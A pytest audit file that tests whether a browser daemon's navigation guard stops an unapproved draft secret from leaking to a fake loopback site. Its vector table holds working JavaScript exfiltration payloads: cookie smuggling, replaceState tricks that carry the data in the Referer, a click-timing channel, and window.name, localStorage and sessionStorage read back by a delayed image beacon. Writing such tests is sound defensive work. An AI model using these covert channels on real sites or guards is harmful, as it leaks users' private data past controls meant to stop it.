"""Round 11 independent audit repros. Real Chromium, real daemon CLICK_NAV, fake site on loopback.
Each vector sets up in-page script, clicks a real <a id=lnk href=/idea?page=2>, then watches the site's raw
request log (path, Cookie, Referer, arrival time). SECRET is the unapproved draft."""
import base64, time, json
import pytest
from test_m18_login_browser import setup, _compose_with_values  # noqa
from test_m18_login_round5 import _nav_click
SECRET = 'UNAPPROVEDSECRET'
D = "document.querySelector('#draft').value"
LNK = ''
def hook(code):
    return LNK + f"document.querySelector('#lnk').addEventListener('click',(e)=>{{{code}}});"
LANDED_LATE = "<html><body><script>setTimeout(()=>{new Image().src='/late?w='+encodeURIComponent(window.name)+'&l='+encodeURIComponent(localStorage.getItem('d')||'')+'&s='+encodeURIComponent(sessionStorage.getItem('d')||'')},%d)</script>landed</body></html>"
V = {
 'cookie_rides_the_allowed_nav': (hook(f"document.cookie='d='+btoa({D})"), None),
 'replaceState_referer': (hook(f"history.replaceState(null,'','/compose?x='+btoa({D}))"), None),
 'replaceState_path_referer': (hook(f"history.replaceState(null,'','/'+btoa({D}))"), None),
 'timing_delay_one_nav': (hook(f"e.preventDefault();const a=e.currentTarget;const d={D}.charCodeAt(0);setTimeout(()=>{{location.href=a.href}},d*20)"), None),
 'window_name_then_late_img_in_landed_doc': (hook(f"window.name={D}"), 7000),
 'localStorage_then_late_img_in_landed_doc': (hook(f"localStorage.setItem('d',{D})"), 7000),
 'sessionStorage_then_late_img_in_landed_doc': (hook(f"sessionStorage.setItem('d',{D})"), 7000),
}
def marks(blob):
    return [m for m in [SECRET, base64.b64encode(SECRET.encode()).decode().rstrip('='), SECRET.encode().hex()] if m in blob]
@pytest.mark.asyncio
@pytest.mark.parametrize('name', sorted(V))
async def test_vec(setup, name):
    code, late = V[name]
    site = setup[6]
    raw = []
    orig = site.do_GET
    def wrapped(self):
        raw.append((time.time(), self.path, self.headers.get('Cookie'), self.headers.get('Referer')))
        if self.path.startswith('/idea?page=2') and late:
            self.send_response(200); self.send_header('Content-Type', 'text/html'); self.end_headers()
            self.wfile.write((LANDED_LATE % 5000).encode()); return
        return orig(self)
    site.do_GET = wrapped
    site.html_hook = lambda html: html.replace('<body>', '<body><a id="lnk" href="/idea?page=2">l</a>')
    try:
        page, _ = await _compose_with_values(setup)
    finally:
        site.html_hook = None
    await page.fill('#draft', SECRET)
    await page.evaluate(code)
    raw.clear()
    t0 = time.time()
    answer = await _nav_click(setup, '#lnk')
    for _ in range(14 if late else 6):
        await page.wait_for_timeout(700)
    blob = json.dumps([r[1:] for r in raw])
    nav = [r for r in raw if r[1].startswith('/idea')]
    print(f"RESULT {name}: ok={answer['ok']} blocked={answer.get('result',{}).get('guard',{}).get('blocked') if answer.get('result') else answer.get('error')!r:.120} leaked={marks(blob)} nav_delay={[round(r[0]-t0,2) for r in nav]} raw={[r[1:] for r in raw][:5]}")
